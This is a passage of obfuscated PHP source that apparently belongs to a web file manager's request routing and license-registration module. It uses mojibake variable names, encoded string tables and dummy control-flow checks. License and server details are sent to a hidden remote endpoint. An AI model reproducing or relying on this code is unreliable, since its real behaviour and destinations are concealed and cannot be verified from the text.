$Ã∏î÷ñ¶[9]), $öø˛Ïñ≈ . $Ã∏î÷ñ¶[10], $˛⁄±∏©ƒ); ActionCall($˛⁄±∏©ƒ); call_user_func(array($Ã∏î÷ñ¶[8], $Ã∏î÷ñ¶[9]), $öø˛Ïñ≈ . $Ã∏î÷ñ¶[11], $˛⁄±∏©ƒ); $≥•˚Ù•Œ = $˛“∑öúñ[699]; if (strlen($≥•˚Ù•Œ) < $˛“∑öúñ[326]) { return; } } private function autorun() { $ƒÔ§ïºù =& $_SERVER[ß⁄ˆÇ†Œ]; $’Ù¸Â…´ =& $_SERVER[è¨ò„Àﬂ]; global $config; if (count($config[$’Ù¸Â…´[12]]) == 0) { return; } foreach ($config[$’Ù¸Â…´[12]] as $¥Úöê£® => $û™È‘åè) { $this->appRun($û™È‘åè); $‘¥Ü”ﬂ¬ = $ƒÔ§ïºù[700]; while ($‘¥Ü”ﬂ¬ < $ƒÔ§ïºù[326]) { if ($‘¥Ü”ﬂ¬ >= 0) { break; } $‘¥Ü”ﬂ¬++; } } } private function htjnab1a9354() { $Æ¢ù™≈î =& $_SERVER[ß⁄ˆÇ†Œ]; $€Ù‹Ìò§ =& $_SERVER[è¨ò„Àﬂ]; $É»¬ÆøÍ = $€Ù‹Ìò§[4]; $»˜π˘π≥ = $Æ¢ù™≈î[701]; while ($»˜π˘π≥ < $Æ¢ù™≈î[695]) { if ($»˜π˘π≥ >= 0) { break; } $»˜π˘π≥++; } $Ã—„±˘¯ = $GLOBALS[$€Ù‹Ìò§[13]][$€Ù‹Ìò§[14]][0]; $ûˆ›¯Âﬁ = $Æ¢ù™≈î[702]; if (!$ûˆ›¯Âﬁ) { return; } if (!$Ã—„±˘¯ || strlen($Ã—„±˘¯) <= strlen($É»¬ÆøÍ)) { return; } if (strtolower(substr($Ã—„±˘¯, -strlen($É»¬ÆøÍ))) != $É»¬ÆøÍ) { return; } $•ÎÓ«ñ“ = substr($Ã—„±˘¯, 0, -strlen($É»¬ÆøÍ)); $Ë°¸∫ãÆ = array($€Ù‹Ìò§[4], $•ÎÓ«ñ“); $ß§Ï√Ã≤ = array_slice($GLOBALS[$€Ù‹Ìò§[13]][$€Ù‹Ìò§[14]], 1); $◊î˘‹”¢ = $Æ¢ù™≈î[703]; if (strlen($◊î˘‹”¢) < $Æ¢ù™≈î[704]) { return; } $GLOBALS[$€Ù‹Ìò§[13]][$€Ù‹Ìò§[14]] = array_merge($Ë°¸∫ãÆ, $ß§Ï√Ã≤); $Øß™Ëø÷ = $Æ¢ù™≈î[705]; $GLOBALS[$€Ù‹Ìò§[13]][$€Ù‹Ìò§[15]] = implode($€Ù‹Ìò§[0], $GLOBALS[$€Ù‹Ìò§[13]][$€Ù‹Ìò§[14]]); } private function oqrd25787161() { $ÃîˆÔÑì =& $_SERVER[ß⁄ˆÇ†Œ]; $úß÷ÔıÜ =& $_SERVER[è¨ò„Àﬂ]; if ($GLOBALS[$úß÷ÔıÜ[13]][$úß÷ÔıÜ[15]] != $úß÷ÔıÜ[6]) { return; } $˙Ø˘…ö¿ = $_SERVER[$úß÷ÔıÜ[16]]; $™‡ñÛè˝ = $ÃîˆÔÑì[706]; $ªº›‡ÂŸ = $úß÷ÔıÜ[17]; $Û‰ΩØ≈‡ = $ÃîˆÔÑì[707]; if (strlen($Û‰ΩØ≈‡) < $ÃîˆÔÑì[693]) { die; } if (!strstr($˙Ø˘…ö¿, $ªº›‡ÂŸ)) { return; } $µöå¸ßú = strrpos($˙Ø˘…ö¿, $ªº›‡ÂŸ); $˚‰‰·–◊ = $ÃîˆÔÑì[708]; if (!$˚‰‰·–◊) { return; } $¿ÍòÎ·è = substr($˙Ø˘…ö¿, $µöå¸ßú + strlen($ªº›‡ÂŸ)); $ñËø€≠Ì = $ÃîˆÔÑì[709]; while (strlen($ñËø€≠Ì) < $ÃîˆÔÑì[704]) { if (!$ñËø€≠Ì) { break; } $ñËø€≠Ì++; } preg_match_all($úß÷ÔıÜ[18], $¿ÍòÎ·è, $◊Ú»ãµò); $¿ÍòÎ·è = trim($◊Ú»ãµò[0][0], $úß÷ÔıÜ[19]); $•æﬁ ¥É = $ÃîˆÔÑì[710]; if (strlen($•æﬁ ¥É) < $ÃîˆÔÑì[704]) { die; } $GLOBALS[$úß÷ÔıÜ[13]][$úß÷ÔıÜ[14]] = explode($úß÷ÔıÜ[19], $¿ÍòÎ·è); $GLOBALS[$úß÷ÔıÜ[13]][$úß÷ÔıÜ[15]] = implode($úß÷ÔıÜ[0], $GLOBALS[$úß÷ÔıÜ[13]][$úß÷ÔıÜ[14]]); } public function run() { $ﬁÿ∆˚ª¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $œ£öê„™ =& $_SERVER[è¨ò„Àﬂ]; $this->oqrd25787161(); $this->htjnab1a9354(); $îü◊ƒ™À = $GLOBALS[$œ£öê„™[13]][$œ£öê„™[14]]; $’¨∂∂€ = $GLOBALS[$œ£öê„™[13]][$œ£öê„™[15]]; define($œ£öê„™[20], isset($îü◊ƒ™À[0]) && $îü◊ƒ™À[0] ? $îü◊ƒ™À[0] : $this->defaultModule); $üì”É˜Ç = $ﬁÿ∆˚ª¿[711]; while (strlen($üì”É˜Ç) < $ﬁÿ∆˚ª¿[704]) { if (!$üì”É˜Ç) { break; } $üì”É˜Ç++; } define($œ£öê„™[21], isset($îü◊ƒ™À[1]) && $îü◊ƒ™À[0] ? $îü◊ƒ™À[1] : $this->defaultController); define($œ£öê„™[22], isset($îü◊ƒ™À[2]) && $îü◊ƒ™À[0] ? $îü◊ƒ™À[2] : $this->defaultAction); define($œ£öê„™[23], MOD . $œ£öê„™[0] . ST . $œ£öê„™[0] . ACT); $î¬¢Õõ© = $ﬁÿ∆˚ª¿[712]; if (strlen($î¬¢Õõ©) < $ﬁÿ∆˚ª¿[688]) { return; } $_SERVER[$œ£öê„™[24]] = strtolower(ACTION); $ÑÅ≥çª¡ = $ﬁÿ∆˚ª¿[713]; $this->autorun(); $ËÙ¿±õª = $ﬁÿ∆˚ª¿[714]; if (!$ËÙ¿±õª) { die; } if (count($îü◊ƒ™À) >= 3) { $this->appRun($’¨∂∂€); } else { $this->appRun(ACTION); } } private $ikfg863a10f8 = array(); private $tjlz46e76026 = ''; public function gjkub896b086() { $åÒ†Ó≤û =& $_SERVER[ß⁄ˆÇ†Œ]; $ı‘∆Ìﬁœ =& $_SERVER[è¨ò„Àﬂ]; $this->npyq089114ae(); $…¶œì†⁄ = $åÒ†Ó≤û[715]; if (strlen($…¶œì†⁄) < $åÒ†Ó≤û[695]) { return; } $this->ruap7e8a0df8(); $this->uxjl481f4656(); $this->pfxe18687997(); $this->vcsib7656530(); $Äá◊¢¡≥ = $åÒ†Ó≤û[716]; while (strlen($Äá◊¢¡≥) < $åÒ†Ó≤û[693]) { if (!$Äá◊¢¡≥) { break; } $Äá◊¢¡≥++; } $this->tcau55e489b6(); $this->bpms2251bbad(); $Ê©‹Æı© = $åÒ†Ó≤û[717]; if (!$Ê©‹Æı©) { return; } $this->jegh08601bc7($ı‘∆Ìﬁœ[25], array($this, $ı‘∆Ìﬁœ[26])); $this->jegh08601bc7($ı‘∆Ìﬁœ[27], array($this, $ı‘∆Ìﬁœ[28])); $‘å’€£˜ = $åÒ†Ó≤û[718]; if (!$‘å’€£˜) { die; } $this->jegh08601bc7($ı‘∆Ìﬁœ[29], array($this, $ı‘∆Ìﬁœ[30])); $˝≥Á„É‘ = $åÒ†Ó≤û[719]; if (strlen($˝≥Á„É‘) < $åÒ†Ó≤û[688]) { die; } $this->jegh08601bc7($ı‘∆Ìﬁœ[31], array($this, $ı‘∆Ìﬁœ[32])); $ÖïÔ»⁄í = $åÒ†Ó≤û[720]; if (!$ÖïÔ»⁄í) { return; } } public function belfee9855ba($ﬁ¢àöÏ˙) { $√≠¡Òüâ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÃıÇ¬Â— =& $_SERVER[è¨ò„Àﬂ]; $£¶ì™π˜ = Model($ÃıÇ¬Â—[33])->get(); $ÂÏå¬Æê = array($ÃıÇ¬Â—[34], $ÃıÇ¬Â—[35], $ÃıÇ¬Â—[36], $ÃıÇ¬Â—[37], $ÃıÇ¬Â—[38], $ÃıÇ¬Â—[39], $ÃıÇ¬Â—[40], $ÃıÇ¬Â—[41], $ÃıÇ¬Â—[42], $ÃıÇ¬Â—[43], $ÃıÇ¬Â—[44], $ÃıÇ¬Â—[45], $ÃıÇ¬Â—[46], $ÃıÇ¬Â—[47], $ÃıÇ¬Â—[48], $ÃıÇ¬Â—[49], $ÃıÇ¬Â—[50], $ÃıÇ¬Â—[51], $ÃıÇ¬Â—[52], $ÃıÇ¬Â—[53], $ÃıÇ¬Â—[54], $ÃıÇ¬Â—[55], $ÃıÇ¬Â—[56], $ÃıÇ¬Â—[57], $ÃıÇ¬Â—[58], $ÃıÇ¬Â—[59], $ÃıÇ¬Â—[60], $ÃıÇ¬Â—[61], $ÃıÇ¬Â—[62], $ÃıÇ¬Â—[63], $ÃıÇ¬Â—[64], $ÃıÇ¬Â—[65], $ÃıÇ¬Â—[66], $ÃıÇ¬Â—[67], $ÃıÇ¬Â—[68], $ÃıÇ¬Â—[69], $ÃıÇ¬Â—[70], $ÃıÇ¬Â—[71], $ÃıÇ¬Â—[72], $ÃıÇ¬Â—[73], $ÃıÇ¬Â—[74], $ÃıÇ¬Â—[75], $ÃıÇ¬Â—[76], $ÃıÇ¬Â—[77], $ÃıÇ¬Â—[78], $ÃıÇ¬Â—[79], $ÃıÇ¬Â—[80], $ÃıÇ¬Â—[81], $ÃıÇ¬Â—[82], $ÃıÇ¬Â—[83], $ÃıÇ¬Â—[84], $ÃıÇ¬Â—[85]); foreach ($ÂÏå¬Æê as $´ÍÈ¬ò„) { $Û¸ØΩŸµ = $GLOBALS[$ÃıÇ¬Â—[86]][$ÃıÇ¬Â—[87]][$´ÍÈ¬ò„]; if (isset($£¶ì™π˜[$´ÍÈ¬ò„])) { $Û¸ØΩŸµ = $£¶ì™π˜[$´ÍÈ¬ò„]; } $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[89]][$´ÍÈ¬ò„] = $Û¸ØΩŸµ; } $◊ ∆ÍÏ = $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[89]][$ÃıÇ¬Â—[46]]; unset($ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[90]][$ÃıÇ¬Â—[91]]); unset($ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[90]][$ÃıÇ¬Â—[92]]); unset($ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[89]][$ÃıÇ¬Â—[46]]); $ôΩ∂œ…≤ = $√≠¡Òüâ[721]; while ($ôΩ∂œ…≤ < $√≠¡Òüâ[704]) { if ($ôΩ∂œ…≤ >= 0) { break; } $ôΩ∂œ…≤++; } unset($ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[89]][$ÃıÇ¬Â—[93]]); $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[89]][$ÃıÇ¬Â—[94]] = array($ÃıÇ¬Â—[95] => (int) $◊ ∆ÍÏ[$ÃıÇ¬Â—[96]], $ÃıÇ¬Â—[97] => (int) _get($◊ ∆ÍÏ, $ÃıÇ¬Â—[98], 0)); $ô¡¿ôö˙ = $√≠¡Òüâ[722]; if (!$ô¡¿ôö˙) { die; } $Ωê˙Äç› = substr(md5($ÃıÇ¬Â—[99] . get_client_ip() . $£¶ì™π˜[$ÃıÇ¬Â—[100]]), 0, 15); $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[102]] = Mcrypt::encode(Session::sign(), $Ωê˙Äç›, 3600 * 24); $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[103]] = Action($ÃıÇ¬Â—[104])->accessToken(); $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[105]] = md5($_SERVER[$ÃıÇ¬Â—[106]] . $£¶ì™π˜[$ÃıÇ¬Â—[100]]); $ŸØ∑∑¶Î = $√≠¡Òüâ[723]; while (strlen($ŸØ∑∑¶Î) < $√≠¡Òüâ[688]) { if (!$ŸØ∑∑¶Î) { break; } $ŸØ∑∑¶Î++; } $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[107]] = base64_encode(serverInfo()); $ö’Ÿ©…» = $√≠¡Òüâ[724]; if (!$ö’Ÿ©…») { die; } $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[108]] = $this->tjlz46e76026; if ($£¶ì™π˜[$ÃıÇ¬Â—[108]] != $ÃıÇ¬Â—[109]) { $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[110]] = $£¶ì™π˜[$ÃıÇ¬Â—[110]]; $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[111]] = $£¶ì™π˜[$ÃıÇ¬Â—[111]]; $˛˚ºÿ≠Ø = rand_string(10) . $this->tjlz46e76026 . rand_string(5); $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[112]][$ÃıÇ¬Â—[113]] = $this->movbf0c46773($˛˚ºÿ≠Ø, $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[105]]); } if ($this->tjlz46e76026 == $ÃıÇ¬Â—[109]) { $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[88]][$ÃıÇ¬Â—[89]][$ÃıÇ¬Â—[94]][$ÃıÇ¬Â—[98]] = 0; } $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[114]] = $this->versionPluginFilter(); $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[115]] = _get($this->ikfg863a10f8, $ÃıÇ¬Â—[116], $ÃıÇ¬Â—[6]); $é÷¯Ÿ»à = $√≠¡Òüâ[725]; if (KodUser::isRoot() && $this->config[$ÃıÇ¬Â—[117]]) { $ﬁ¢àöÏ˙[$ÃıÇ¬Â—[101]][$ÃıÇ¬Â—[118]] = WEB_ROOT; } return $ﬁ¢àöÏ˙; } private function tcau55e489b6() { $óò„ †Ã =& $_SERVER[ß⁄ˆÇ†Œ]; $‹ÛŸÀ√Í =& $_SERVER[è¨ò„Àﬂ]; $˙£Òô¨É = $_SERVER[$‹ÛŸÀ√Í[24]] == $‹ÛŸÀ√Í[119]; $°æΩû∫‰ = $óò„ †Ã[726]; if (strlen($°æΩû∫‰) < $óò„ †Ã[695]) { die; } if ($_SERVER[$‹ÛŸÀ√Í[24]] == $‹ÛŸÀ√Í[120] && $_GET[$‹ÛŸÀ√Í[121]] == $‹ÛŸÀ√Í[122]) { $˙£Òô¨É = !0; } if ($˙£Òô¨É) { $ÿ±¶±ΩÕ = array($‹ÛŸÀ√Í[108] => $this->tjlz46e76026, $‹ÛŸÀ√Í[123] => $this->mwhb27d5f33e(), $‹ÛŸÀ√Í[124] => Model($‹ÛŸÀ√Í[125])->count()); if ($this->tjlz46e76026 != $‹ÛŸÀ√Í[109]) { $ŒÌø†√Ä = _get($this->ikfg863a10f8, $‹ÛŸÀ√Í[126]); if ($ŒÌø†√Ä) { $ÿ±¶±ΩÕ[$‹ÛŸÀ√Í[127]] = $ŒÌø†√Ä; $ÿ±¶±ΩÕ[$‹ÛŸÀ√Í[128]] = strtotime(_get($this->ikfg863a10f8, $‹ÛŸÀ√Í[129])); $ÿ±¶±ΩÕ[$‹ÛŸÀ√Í[130]] = _get($this->ikfg863a10f8, $‹ÛŸÀ√Í[116]); } $â…áË°á = Model($‹ÛŸÀ√Í[33])->get($‹ÛŸÀ√Í[131], $‹ÛŸÀ√Í[6], !0); if (is_string($â…áË°á) && substr($â…áË°á, 0, 1) == $‹ÛŸÀ√Í[132]) { $â…áË°á = json_decode_force($â…áË°á); } if (is_array($â…áË°á) && $â…áË°á[$‹ÛŸÀ√Í[133]] && strstr($â…áË°á[$‹ÛŸÀ√Í[133]], $‹ÛŸÀ√Í[134])) { $‰Ä ÷¸ô = explode($‹ÛŸÀ√Í[134], $â…áË°á[$‹ÛŸÀ√Í[133]]); $ÿ±¶±ΩÕ[$‹ÛŸÀ√Í[135]] = $‰Ä ÷¸ô[0]; } } $ÿ±¶±ΩÕ = $this->shwy74269dfb(json_encode($ÿ±¶±ΩÕ), md5($‹ÛŸÀ√Í[136])); $£ÈÙ∆ç⁄ = $óò„ †Ã[727]; while ($£ÈÙ∆ç⁄ < $óò„ †Ã[695]) { if ($£ÈÙ∆ç⁄ >= 0) { break; } $£ÈÙ∆ç⁄++; } $·Ãﬂ™·ﬁ = array($‹ÛŸÀ√Í[137] => $ÿ±¶±ΩÕ); $¡±⁄ûΩâ = $óò„ †Ã[728]; call_user_func(array($‹ÛŸÀ√Í[138], $‹ÛŸÀ√Í[139]), $·Ãﬂ™·ﬁ); $ÆöºÂùÈ = $óò„ †Ã[729]; if (strlen($ÆöºÂùÈ) < $óò„ †Ã[693]) { die; } } if ($this->tjlz46e76026 == $‹ÛŸÀ√Í[109]) { return; } $Ê÷Ü°ú¶ = array($‹ÛŸÀ√Í[140], $‹ÛŸÀ√Í[141], $‹ÛŸÀ√Í[142], $‹ÛŸÀ√Í[143], $‹ÛŸÀ√Í[144], $‹ÛŸÀ√Í[145]); $ﬂ“µÙà≥ = $óò„ †Ã[730]; while (strlen($ﬂ“µÙà≥) < $óò„ †Ã[704]) { if (!$ﬂ“µÙà≥) { break; } $ﬂ“µÙà≥++; } $´¿´âπø = Model($‹ÛŸÀ√Í[33])->get(); $ﬂÑ“¸ã· = $óò„ †Ã[731]; while ($ﬂÑ“¸ã· < $óò„ †Ã[693]) { if ($ﬂÑ“¸ã· >= 0) { break; } $ﬂÑ“¸ã·++; } $·Ãﬂ™·ﬁ = array($‹ÛŸÀ√Í[146] => $´¿´âπø[$‹ÛŸÀ√Í[34]], $‹ÛŸÀ√Í[147] => $´¿´âπø[$‹ÛŸÀ√Í[35]], $‹ÛŸÀ√Í[148] => $‹ÛŸÀ√Í[6]); $™¶áß§Ù = $óò„ †Ã[732]; if (strlen($™¶áß§Ù) < $óò„ †Ã[326]) { return; } foreach ($Ê÷Ü°ú¶ as $˚âêæñµ) { if (!isset($´¿´âπø[$˚âêæñµ]) || !$´¿´âπø[$˚âêæñµ]) { continue; } $·Ãﬂ™·ﬁ[$˚âêæñµ] = $´¿´âπø[$˚âêæñµ]; } call_user_func(array($‹ÛŸÀ√Í[138], $‹ÛŸÀ√Í[139]), $·Ãﬂ™·ﬁ); } private function pfxe18687997() { $£›ë¨ôê =& $_SERVER[ß⁄ˆÇ†Œ]; $êÑ˚ôÌª =& $_SERVER[è¨ò„Àﬂ]; if ($_SERVER[$êÑ˚ôÌª[24]] != $êÑ˚ôÌª[149]) { return; } if (!KodUser::isRoot()) { die; } $Â£´¢Ó— = $GLOBALS[$êÑ˚ôÌª[13]]; if (isset($Â£´¢Ó—[$êÑ˚ôÌª[150]])) { $this->dyzsc87ba3d1(); die; } if (isset($Â£´¢Ó—[$êÑ˚ôÌª[151]]) && isset($Â£´¢Ó—[$êÑ˚ôÌª[151]]) == $êÑ˚ôÌª[122]) { $Â£´¢Ó—[$êÑ˚ôÌª[152]] = Model($êÑ˚ôÌª[33])->get($êÑ˚ôÌª[153]); } if (!isset($Â£´¢Ó—[$êÑ˚ôÌª[152]]) || strlen($Â£´¢Ó—[$êÑ˚ôÌª[152]]) != 16) { show_json($êÑ˚ôÌª[154] . $Â£´¢Ó—[$êÑ˚ôÌª[152]], !1); } $äÏ÷ˆí = Model($êÑ˚ôÌª[33])->get($êÑ˚ôÌª[100]); $˛¨‹äò≈ = md5($_SERVER[$êÑ˚ôÌª[106]] . $äÏ÷ˆí); $ÆòŒ¨íÈ = $£›ë¨ôê[733]; while (strlen($ÆòŒ¨íÈ) < $£›ë¨ôê[326]) { if (!$ÆòŒ¨íÈ) { break; } $ÆòŒ¨íÈ++; } $≥¡˘È©˝ = array($êÑ˚ôÌª[152] => $Â£´¢Ó—[$êÑ˚ôÌª[152]], $êÑ˚ôÌª[155] => rand_string(16), $êÑ˚ôÌª[156] => $êÑ˚ôÌª[136], $êÑ˚ôÌª[157] => $êÑ˚ôÌª[158], $êÑ˚ôÌª[159] => $_SERVER[$êÑ˚ôÌª[160]], $êÑ˚ôÌª[161] => $_SERVER[$êÑ˚ôÌª[162]], $êÑ˚ôÌª[163] => $_SERVER[$êÑ˚ôÌª[164]], $êÑ˚ôÌª[105] => $˛¨‹äò≈, $êÑ˚ôÌª[165] => Model($êÑ˚ôÌª[33])->get($êÑ˚ôÌª[131])); $…È™ü¯∆ = $£›ë¨ôê[734]; while (strlen($…È™ü¯∆) < $£›ë¨ôê[695]) { if (!$…È™ü¯∆) { break; } $…È™ü¯∆++; } if (isset($Â£´¢Ó—[$êÑ˚ôÌª[151]]) && isset($Â£´¢Ó—[$êÑ˚ôÌª[151]]) == $êÑ˚ôÌª[122]) { $≥¡˘È©˝[$êÑ˚ôÌª[151]] = md5($≥¡˘È©˝[$êÑ˚ôÌª[152]] . $êÑ˚ôÌª[166] . $≥¡˘È©˝[$êÑ˚ôÌª[155]]); } if ($Â£´¢Ó—[$êÑ˚ôÌª[167]] == $êÑ˚ôÌª[168]) { $±ƒª•ìµ = $this->shwy74269dfb($˛¨‹äò≈, $êÑ˚ôÌª[169]); $ﬂö∆…Àπ = $this->movbf0c46773(json_encode($≥¡˘È©˝), $˛¨‹äò≈ . $êÑ˚ôÌª[170], 3); $ﬂö∆…Àπ = $ﬂö∆…Àπ . $êÑ˚ôÌª[171] . $_SERVER[$êÑ˚ôÌª[160]]; $ü¯∞â“Ø = $this->wxql0bf7c415($êÑ˚ôÌª[172] . $±ƒª•ìµ . $êÑ˚ôÌª[173] . $ﬂö∆…Àπ, -1); show_json($ü¯∞â“Ø, !0); } else { if ($Â£´¢Ó—[$êÑ˚ôÌª[167]] == $êÑ˚ôÌª[174]) { $ŒÌ˘Ùä´ = substr(md5($êÑ˚ôÌª[175] . $˛¨‹äò≈), 12, 15) . $êÑ˚ôÌª[176]; $ﬂö∆…Àπ = $this->hoqy66faaedf(trim($Â£´¢Ó—[$êÑ˚ôÌª[177]]), $ŒÌ˘Ùä´, 2); $“‡º„¡¿ = json_decode($ﬂö∆…Àπ, !0); if (!is_array($“‡º„¡¿) || !is_array($“‡º„¡¿[$êÑ˚ôÌª[178]]) || $“‡º„¡¿[$êÑ˚ôÌª[152]] != !0) { $©Æ°Ò≤‹ = $êÑ˚ôÌª[179]; $Ï◊Øí®€ = $“‡º„¡¿[$êÑ˚ôÌª[178]] ? $êÑ˚ôÌª[180] . $“‡º„¡¿[$êÑ˚ôÌª[178]] : $©Æ°Ò≤‹; show_json($Ï◊Øí®€, !1); } else { $≥¡˘È©˝[$êÑ˚ôÌª[155]] = $“‡º„¡¿[$êÑ˚ôÌª[178]][$êÑ˚ôÌª[181]]; } } else { $“‡º„¡¿ = $this->wxql0bf7c415($êÑ˚ôÌª[182], $≥¡˘È©˝, 10); $È¸Ü”˛≥ = $£›ë¨ôê[735]; if (strlen($È¸Ü”˛≥) < $£›ë¨ôê[326]) { return; } } } if (!is_array($“‡º„¡¿) || !is_array($“‡º„¡¿[$êÑ˚ôÌª[178]]) || $“‡º„¡¿[$êÑ˚ôÌª[152]] != !0) { $©Æ°Ò≤‹ = LNG($êÑ˚ôÌª[183]); $Ï◊Øí®€ = $“‡º„¡¿[$êÑ˚ôÌª[178]] ? $êÑ˚ôÌª[180] . $“‡º„¡¿[$êÑ˚ôÌª[178]] : $©Æ°Ò≤‹; show_json($Ï◊Øí®€, !1); } $∏öçÕŸË = $“‡º„¡¿[$êÑ˚ôÌª[178]]; $∆´úÊà¯ = $this->atbv31eea042($∏öçÕŸË[$êÑ˚ôÌª[184]]); if (!$∆´úÊà¯ || $∆´úÊà¯ != $∏öçÕŸË[$êÑ˚ôÌª[129]]) { $∫ﬂ¿·´ñ = array($êÑ˚ôÌª[185] => Model($êÑ˚ôÌª[33])->get($êÑ˚ôÌª[100]), $êÑ˚ôÌª[186] => $_SERVER[$êÑ˚ôÌª[106]], $êÑ˚ôÌª[187] => this_url(), $êÑ˚ôÌª[161] => $_SERVER[$êÑ˚ôÌª[162]]); $ﬂö∆…Àπ = $this->vmtg8d149cd5(json_encode($∫ﬂ¿·´ñ)); $this->wxql0bf7c415($êÑ˚ôÌª[188] . $ﬂö∆…Àπ); show_json(LNG($êÑ˚ôÌª[189]), !0); } $‡‰∂Î∏∆ = array($êÑ˚ôÌª[153] => $∏öçÕŸË[$êÑ˚ôÌª[190]], $êÑ˚ôÌª[191] => $∏öçÕŸË[$êÑ˚ôÌª[192]], $êÑ˚ôÌª[193] => rand_string(16), $êÑ˚ôÌª[108] => $∏öçÕŸË[$êÑ˚ôÌª[194]]); if ($≥¡˘È©˝[$êÑ˚ôÌª[155]]) { $‡‰∂Î∏∆[$êÑ˚ôÌª[193]] = $≥¡˘È©˝[$êÑ˚ôÌª[155]]; } $±ôüÈÏ = substr(md5($‡‰∂Î∏∆[$êÑ˚ôÌª[191]]), 10, 10); $ˆﬂöäõò = $±ôüÈÏ . $‡‰∂Î∏∆[$êÑ˚ôÌª[108]] . $‡‰∂Î∏∆[$êÑ˚ôÌª[193]]; $Å‘≤∑Ÿ˙ = $£›ë¨ôê[736]; $‡‰∂Î∏∆[$êÑ˚ôÌª[110]] = strrev(base64_encode($this->shwy74269dfb($ˆﬂöäõò, $êÑ˚ôÌª[195]))); $∫ò‚≥Œ = $£›ë¨ôê[737]; $¶ƒìçëú = rand_string(16); $–ŒÙÎÆß = $¶ƒìçëú . $‡‰∂Î∏∆[$êÑ˚ôÌª[108]] . $this->shwy74269dfb(md5($‡‰∂Î∏∆[$êÑ˚ôÌª[153]]), $¶ƒìçëú); $”›õúôˆ = $£›ë¨ôê[738]; if (strlen($”›õúôˆ) < $£›ë¨ôê[693]) { return; } $‡‰∂Î∏∆[$êÑ˚ôÌª[111]] = base64_encode(strrev($this->shwy74269dfb($–ŒÙÎÆß, $êÑ˚ôÌª[196]))); if ($∏öçÕŸË[$êÑ˚ôÌª[197]] && $∏öçÕŸË[$êÑ˚ôÌª[197]] >= 1) { Model($êÑ˚ôÌª[33])->setDeep($êÑ˚ôÌª[198], $êÑ˚ôÌª[122]); } Model($êÑ˚ôÌª[33])->set($‡‰∂Î∏∆); $ÎÕ”…“‡ = md5($_SERVER[$êÑ˚ôÌª[106]] . strrev($äÏ÷ˆí) . $‡‰∂Î∏∆[$êÑ˚ôÌª[191]]); $ ™‹÷êµ = strrev(substr($ÎÕ”…“‡, 10, 16)); $ì—∫áï± = $£›ë¨ôê[739]; if (strlen($ì—∫áï±) < $£›ë¨ôê[704]) { return; } $ã§®Á—ã = $this->movbf0c46773(json_encode($∏öçÕŸË), $ÎÕ”…“‡); $˘¨œº˛ó = array_to_keyvalue(Model($êÑ˚ôÌª[7])->listData(), $êÑ˚ôÌª[199]); $µ÷ó∫ÿƒ = $£›ë¨ôê[740]; $∫°´‘ûÖ = $˘¨œº˛ó[$êÑ˚ôÌª[200]]; $≤‚≠ﬂ˝“ = $£›ë¨ôê[741]; if (!$≤‚≠ﬂ˝“) { return; } $‹é∆õ¢Ë = array(); $‹é∆õ¢Ë[$ ™‹÷êµ] = $ã§®Á—ã; Model($êÑ˚ôÌª[7])->update($∫°´‘ûÖ[$êÑ˚ôÌª[201]], array($êÑ˚ôÌª[202] => $‹é∆õ¢Ë)); $this->ikfg863a10f8 = $∏öçÕŸË; $À€—ˆï´ = $£›ë¨ôê[742]; if (!$À€—ˆï´) { return; } $this->tjlz46e76026 = $‡‰∂Î∏∆[$êÑ˚ôÌª[108]]; $this->licenseRegistSuccess(); Cache::set($êÑ˚ôÌª[203] . md5($äÏ÷ˆí . $êÑ˚ôÌª[204]), $êÑ˚ôÌª[6]); $˝ûÀ§ﬁõ = $£›ë¨ôê[743]; if (!$˝ûÀ§ﬁõ) { return; } show_json(LNG($êÑ˚ôÌª[189]), !0); $Çå‘Ç¯é = $£›ë¨ôê[744]; } private function licenseRegistSuccess() { $ôÙË‹¢Ÿ =& $_SERVER[è¨ò„Àﬂ]; $è≤∫üù„ = Model($ôÙË‹¢Ÿ[33])->get(); if ($è≤∫üù„[$ôÙË‹¢Ÿ[63]] != $ôÙË‹¢Ÿ[122]) { Model($ôÙË‹¢Ÿ[33])->set($ôÙË‹¢Ÿ[63], $ôÙË‹¢Ÿ[122]); } Action($ôÙË‹¢Ÿ[205])->initStart(!0); } private function dyzsc87ba3d1() { $œÏÁı†Æ =& $_SERVER[ß⁄ˆÇ†Œ]; $±´ûÀ»ˆ =& $_SERVER[è¨ò„Àﬂ]; Model($±´ûÀ»ˆ[33])->set(array($±´ûÀ»ˆ[153] => $±´ûÀ»ˆ[6], $±´ûÀ»ˆ[191] => $±´ûÀ»ˆ[6], $±´ûÀ»ˆ[108] => $±´ûÀ»ˆ[109], $±´ûÀ»ˆ[110] => $±´ûÀ»ˆ[6], $±´ûÀ»ˆ[111] => $±´ûÀ»ˆ[6])); Model($±´ûÀ»ˆ[33])->setDeep($±´ûÀ»ˆ[198], $±´ûÀ»ˆ[206]); $this->ikfg863a10f8 = array(); $’ÅÅœ˚  = $œÏÁı†Æ[745]; if (!$’ÅÅœ˚ ) { die; } $this->tjlz46e76026 = $±´ûÀ»ˆ[109]; $”êï„°≤ 